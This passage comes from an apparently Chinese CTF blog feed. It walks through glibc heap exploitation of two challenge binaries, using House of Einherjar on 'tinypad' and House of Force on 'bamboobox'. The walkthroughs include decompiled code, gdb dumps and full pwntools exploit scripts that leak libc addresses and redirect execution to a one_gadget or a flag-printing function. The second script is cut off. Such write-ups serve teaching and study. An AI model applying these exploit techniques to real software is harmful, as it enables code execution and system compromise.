<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">free(3)</span><br><span class="line">sh.recvuntil(&#39; # CONTENT: &#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20   #leak libc_base</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br></pre></td></tr></table></figure>

<p>​    因为chunk3和top chunk相邻，所以释放时不会被加入Unsorted Bin。然后直接合并到top chunk中。然后此时，fastbin中有两个相邻堆块，并且与top chunk相邻，会触发合并，fastbin-&gt; 1-&gt; 2，首先1会先被加入unsorted bin中，此时chunk 1’so fd和bk指针会指向main_arena + 88（Unsorted Bin）地址。然后chunk 2和chunk 1合并成一个新的chunk放入unsorted bin中。这个过程并不会改变chunk 1的fd和bk指针。所以此时输出memo 1的内容就会输出unsorted bin的地址，继而算出libc地址。</p>
<p>3.house of einherjar攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x18, &#39;a&#39;*0x10)  #1</span><br><span class="line">add(0x100, &#39;b&#39;*0xf8+&#39;\x11&#39;) #2   </span><br><span class="line">add(0x100, &#39;c&#39;*0xf8) #3</span><br><span class="line">add(0x100, &#39;d&#39;*0xf8) #4</span><br><span class="line"></span><br><span class="line">tinypad &#x3D; 0x0000000000602040</span><br><span class="line">offest&#x3D;heap_addr+0x20-0x602060</span><br><span class="line">sh.success(&#39;offest : &#39; +hex(offest))</span><br><span class="line">fake_chunk&#x3D;p64(0)+p64(0x101)+p64(0x602060)*2</span><br><span class="line">edit(3,&#39;c&#39;*0x20+fake_chunk)</span><br><span class="line">free(1)</span><br><span class="line">add(0x18,&#39;a&#39;*0x10+p64(offest))</span><br><span class="line">free(2)</span><br><span class="line">edit(4, &quot;4&quot;*0x20 + p64(0) + p64(0x101) + p64(main_arena + 88)*2)</span><br><span class="line">#gdb.attach(sh)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x100, &#39;b&#39;*0xf8+&#39;\x11&#39;) #2</span><br></pre></td></tr></table></figure>

<p>​    因为off by one 导致chunk3的size位变为0，所以需要伪造上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">edit(3,&#39;c&#39;*0x20+fake_chunk)</span><br></pre></td></tr></table></figure>

<p>​    这里需要在tinypad伪造chunk，为后续house of einherjar做准备。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x18,&#39;a&#39;*0x10+p64(offest))</span><br></pre></td></tr></table></figure>

<p>​    覆盖prev_size，准备unlink</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">edit(4, &quot;4&quot;*0x20 + p64(0) + p64(0x101) + p64(main_arena + 88)*2)</span><br></pre></td></tr></table></figure>

<p>​    0x101是为了后面分配用的，而p64(leak_libc+88)*2 这里，你只要bk是个可写的地址就行了，不要是不可写的就行，unsortedbin攻击里讲过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#在 glibc&#x2F;malloc&#x2F;malloc.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck-&gt;fd 的位置写入本 Unsorted Bin 的位置。</span><br><span class="line"></span><br><span class="line">          &#x2F;* remove from unsorted list *&#x2F;</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))</span><br><span class="line">            malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk &#x3D; bck;</span><br><span class="line">          bck-&gt;fd &#x3D; unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>4.获取environ指针</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">one_gadget&#x3D;libc_base+0xf1207</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line">environ_pointer&#x3D;libc_base+libc.symbols[&#39;__environ&#39;]</span><br><span class="line">sh.success(&#39;environ_pointer : &#39; +hex(environ_pointer))</span><br></pre></td></tr></table></figure>

<p>​    在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，可通过 environ 指针泄露栈地址。</p>
<p>相关知识：</p>
<p><a href="http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/" target="_blank" rel="noopener external nofollow noreferrer">http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/</a></p>
<p>5.get shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0xf0, &#39;1&#39;*0xd0 + p64(0x18) + p64(environ_pointer)+&#39;a&#39;*8+p64(0x602148))</span><br><span class="line">sh.recvuntil(&quot; #   INDEX: 1\n&quot;)</span><br><span class="line">sh.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">main_ret&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-0xf0</span><br><span class="line">sh.success(&#39;main_ret : &#39; +hex(main_ret))</span><br><span class="line">edit(2, p64(main_ret))</span><br><span class="line">edit(1, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">sh.sendline(&#39;q&#39;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0xf0, &#39;1&#39;*0xd0 + p64(0x18) + p64(environ_pointer)+&#39;a&#39;*8+p64(0x602148))</span><br></pre></td></tr></table></figure>

<p>​    将[tinypad +256]中的Chunk2的堆栈地址修改为chunk1，将chunk1的堆栈地址修改为Environ_pointer，泄露Environ_pointer的栈地址，得到main_ret地址，再造成main_ret-&gt;one_gadget的情况。</p>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;tinypad&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;tinypad&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">	sh.sendline(&#39;A&#39;)</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;E&#39;)</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(content)</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">	sh.sendline(&#39;Y&#39;)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;D&#39;)</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x70,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x70,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x100,&#39;L0ne1y&#39;)</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">sh.recvuntil(&#39; # CONTENT: &#39;)   #leak heap_base</span><br><span class="line">heap_addr&#x3D;u64(sh.recvline().rstrip().ljust(8, &#39;\x00&#39;))-0x80</span><br><span class="line">sh.success(&#39;heap_addr: &#39; +hex(heap_addr))</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">sh.recvuntil(&#39; # CONTENT: &#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20   #leak libc_base</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">add(0x18, &#39;a&#39;*0x10)  #1</span><br><span class="line">add(0x100, &#39;b&#39;*0xf8+&#39;\x11&#39;) #2</span><br><span class="line">add(0x100, &#39;c&#39;*0xf8) #3</span><br><span class="line">add(0x100, &#39;d&#39;*0xf8) #4</span><br><span class="line"></span><br><span class="line">#house of einherjar</span><br><span class="line">tinypad &#x3D; 0x0000000000602040</span><br><span class="line">offest&#x3D;heap_addr+0x20-0x602060</span><br><span class="line">sh.success(&#39;offest : &#39; +hex(offest))</span><br><span class="line">fake_chunk&#x3D;p64(0)+p64(0x101)+p64(0x602060)*2</span><br><span class="line">edit(3,&#39;c&#39;*0x20+fake_chunk)</span><br><span class="line">free(1)</span><br><span class="line">add(0x18,&#39;a&#39;*0x10+p64(offest))</span><br><span class="line">free(2)</span><br><span class="line">edit(4, &quot;4&quot;*0x20 + p64(0) + p64(0x101) + p64(main_arena + 88)*2)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#get environ</span><br><span class="line">one_gadget&#x3D;libc_base+0xf1207</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line">environ_pointer&#x3D;libc_base+libc.symbols[&#39;__environ&#39;]</span><br><span class="line">sh.success(&#39;environ_pointer : &#39; +hex(environ_pointer))</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#Modified the stack addresses of Chunk2 in [Tinypad +256] to chunk1 and the stack addresses of Chunk1 to Environ_pointer</span><br><span class="line">add(0xf0, &#39;1&#39;*0xd0 + p64(0x18) + p64(environ_pointer)+&#39;a&#39;*8+p64(0x602148))</span><br><span class="line"></span><br><span class="line">#get shell</span><br><span class="line">sh.recvuntil(&quot; #   INDEX: 1\n&quot;)</span><br><span class="line">sh.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">main_ret&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-0xf0</span><br><span class="line">sh.success(&#39;main_ret : &#39; +hex(main_ret))</span><br><span class="line">edit(2, p64(main_ret))</span><br><span class="line">edit(1, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">sh.sendline(&#39;q&#39;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://v1ckydxp.github.io/2019/07/07/House_Of_Einherjar--2016-Seccon-tinypad-writeup/" target="_blank" rel="noopener external nofollow noreferrer">https://v1ckydxp.github.io/2019/07/07/House_Of_Einherjar--2016-Seccon-tinypad-writeup/</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_einherjar-zh/" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_einherjar-zh/</a></p>
<p><a href="https://noonegroup.xyz/posts/14c79378/" target="_blank" rel="noopener external nofollow noreferrer">https://noonegroup.xyz/posts/14c79378/</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>House of Force</title>
    <url>/2020/09/30/House-of-Force/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/rpCue86WmvxHlAX.jpg" alt="5f62d6be6d2fa.jpg"></p>
<a id="more"></a>

<p>关于<code>House of Force</code>的原理，可以看一下CTF WIKI，我这里就不详细讲了，直接上例题。</p>
<h3 id="HITCON-training-lab-11"><a href="#HITCON-training-lab-11" class="headerlink" title="HITCON training lab 11"></a>HITCON training lab 11</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; &#x2F;&#x2F; [sp+8h] [bp-18h]@1</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-10h]@2</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  v3 &#x3D; malloc(0x10uLL);</span><br><span class="line">  *v3 &#x3D; hello_message;</span><br><span class="line">  v3[1] &#x3D; goodbye_message;</span><br><span class="line">  (*v3)(16LL, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    switch ( atoi(&amp;buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        show_item();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        add_item();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        change_item();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        remove_item();</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        (v3[1])(&amp;buf, &amp;buf);</span><br><span class="line">        exit(0);</span><br><span class="line">        return;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;invaild choice!!!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add-item函数如下："><a href="#add-item函数如下：" class="headerlink" title="add_item函数如下："></a>add_item函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 add_item()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax@3</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; rcx@12</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+4h] [bp-1Ch]@4</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+8h] [bp-18h]@2</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-10h]@2</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  if ( num &gt; 99 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;the box is full&quot;);</span><br><span class="line">LABEL_11:</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">    goto LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Please enter the length of item name:&quot;);</span><br><span class="line">  read(0, &amp;buf, 8uLL);</span><br><span class="line">  v3 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 99; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !*&amp;itemlist[4 * i + 2] )</span><br><span class="line">      &#123;</span><br><span class="line">        itemlist[4 * i] &#x3D; v3;</span><br><span class="line">        *&amp;itemlist[4 * i + 2] &#x3D; malloc(v3);</span><br><span class="line">        printf(&quot;Please enter the name of item:&quot;);</span><br><span class="line">        *(*&amp;itemlist[4 * i + 2] + read(0, *&amp;itemlist[4 * i + 2], v3)) &#x3D; 0;</span><br><span class="line">        ++num;</span><br><span class="line">        goto LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    goto LABEL_11;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;invaild length&quot;);</span><br><span class="line">  result &#x3D; 0LL;</span><br><span class="line">LABEL_12:</span><br><span class="line">  v1 &#x3D; *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show-item函数如下："><a href="#show-item函数如下：" class="headerlink" title="show_item函数如下："></a>show_item函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int show_item()</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax@2</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+Ch] [bp-4h]@3</span><br><span class="line"></span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 99; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *&amp;itemlist[4 * i + 2] )</span><br><span class="line">        printf(&quot;%d : %s&quot;, i, *&amp;itemlist[4 * i + 2]);</span><br><span class="line">    &#125;</span><br><span class="line">    result &#x3D; puts(byte_401089);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; puts(&quot;No item in the box&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="change-item函数如下："><a href="#change-item函数如下：" class="headerlink" title="change_item函数如下："></a>change_item函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 change_item()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; &#x2F;&#x2F; ST08_4@4</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+4h] [bp-2Ch]@3</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-20h]@3</span><br><span class="line">  char nptr; &#x2F;&#x2F; [sp+20h] [bp-10h]@4</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+28h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of item:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    v2 &#x3D; atoi(&amp;buf);</span><br><span class="line">    if ( *&amp;itemlist[4 * v2 + 2] )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Please enter the length of item name:&quot;, &amp;buf);</span><br><span class="line">      read(0, &amp;nptr, 8uLL);</span><br><span class="line">      v0 &#x3D; atoi(&amp;nptr);</span><br><span class="line">      printf(&quot;Please enter the new name of the item:&quot;, &amp;nptr);</span><br><span class="line">      *(*&amp;itemlist[4 * v2 + 2] + read(0, *&amp;itemlist[4 * v2 + 2], v0)) &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No item in the box&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="remove-item函数如下："><a href="#remove-item函数如下：" class="headerlink" title="remove_item函数如下："></a>remove_item函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 remove_item()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-14h]@3</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-10h]@3</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of item:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    v1 &#x3D; atoi(&amp;buf);</span><br><span class="line">    if ( *&amp;itemlist[4 * v1 + 2] )</span><br><span class="line">    &#123;</span><br><span class="line">      free(*&amp;itemlist[4 * v1 + 2]);</span><br><span class="line">      *&amp;itemlist[4 * v1 + 2] &#x3D; 0LL;</span><br><span class="line">      itemlist[4 * v1] &#x3D; 0;</span><br><span class="line">      puts(&quot;remove successful!!&quot;);</span><br><span class="line">      --num;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No item in the box&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="magic函数如下："><a href="#magic函数如下：" class="headerlink" title="magic函数如下："></a>magic函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __noreturn magic()</span><br><span class="line">&#123;</span><br><span class="line">  int fd; &#x2F;&#x2F; ST0C_4@1</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-70h]@1</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  fd &#x3D; open(&quot;.&#x2F;flag&quot;, 0);</span><br><span class="line">  read(fd, &amp;buf, 0x64uLL);</span><br><span class="line">  close(fd);</span><br><span class="line">  printf(&quot;%s&quot;, &amp;buf);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p>1.首先申请一个chunk1，为覆盖<code>top chunk</code>做准备。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;10gx 0x175c000</span><br><span class="line">0x175c000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x175c010:	0x0000000000400896	0x00000000004008b1     &lt;----hello_message，goodbye_message</span><br><span class="line">0x175c020:	0x0000000000000000	0x0000000000000041     &lt;----chunk1_size</span><br><span class="line">0x175c030:	0x0000000a61616464	0x0000000000000000</span><br><span class="line">0x175c040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">gdb-peda$ </span><br><span class="line">0x175c050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x175c060:	0x0000000000000000	0x0000000000020fa1     &lt;----top chunk</span><br><span class="line">0x175c070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x175c080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x175c090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>2.溢出覆盖<code>top chunk</code>的size位为0xffffffffffffffff，也就是-1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;10gx 0x1028020</span><br><span class="line">0x1028020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1028030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1028040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1028050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1028060:	0x6161616161616161	0xffffffffffffffff   &lt;----top chunk</span><br></pre></td></tr></table></figure>

<p>此时<code>top chunk</code>位置<code>0x1a7c060</code></p>
<p>3.我们要覆盖的地址是<code>0x1a7c010</code>，所以我们申请的chunk就是：<code>0x1a7c010-0x10-0x1a7c060=-0x60</code>.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">   Check if a request is so large that it would wrap around zero when</span><br><span class="line">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="line">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">#define REQUEST_OUT_OF_RANGE(req)                                              \</span><br><span class="line">    ((unsigned long) (req) &gt;&#x3D; (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span><br><span class="line">&#x2F;* pad request bytes into a usable size -- internal version *&#x2F;</span><br><span class="line">&#x2F;&#x2F;MALLOC_ALIGN_MASK &#x3D; 2 * SIZE_SZ -1</span><br><span class="line">#define request2size(req)                                                      \</span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line">&#x2F;*  Same, except also perform argument check *&#x2F;</span><br><span class="line"></span><br><span class="line">#define checked_request2size(req, sz)                                          \</span><br><span class="line">    if (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="line">        __set_errno(ENOMEM);                                                   \</span><br><span class="line">        return 0;                                                              \</span><br><span class="line">    &#125;                                                                          \</span><br><span class="line">    (sz) &#x3D; request2size(req);</span><br></pre></td></tr></table></figure>

<p>这里先要过掉第一个检查， <code>-2*MINSIZE</code>，可以pass,接下来要让我们的<br><code>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</code> 刚好等于=-60<br>所以要减掉个<code>SIZE_SZ</code>, -68就是malloc大小了</p>
<p>4.我们再malloc一次就可以了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ heap</span><br><span class="line">0x1bb6000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0x0, </span><br><span class="line">  size &#x3D; 0x21, </span><br><span class="line">  fd &#x3D; 0x400d49 &lt;magic&gt;,     &lt;----可以看到已经修改成功了，退出一下就可以了。</span><br><span class="line">  bk &#x3D; 0x400d49 &lt;magic&gt;, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x39</span><br><span class="line">&#125;</span><br><span class="line">0x1bb6020 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0x0, </span><br><span class="line">  size &#x3D; 0x39, </span><br><span class="line">  fd &#x3D; 0x6161616161616161, </span><br><span class="line">  bk &#x3D; 0x6161616161616161, </span><br><span class="line">  fd_nextsize &#x3D; 0x6161616161616161, </span><br><span class="line">  bk_nextsize &#x3D; 0x6161616161616161</span><br><span class="line">&#125;</span><br><span class="line">0x1bb6058 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0x6161616161616161, </span><br><span class="line">  size &#x3D; 0x6161616161616161, </span><br><span class="line">  fd &#x3D; 0xffffffffffffa1, </span><br><span class="line">  bk &#x3D; 0xa, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r &#x3D; process(&#39;.&#x2F;bamboobox&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def additem(length, name):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def modify(idx, length, name):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def remove(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;4&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def 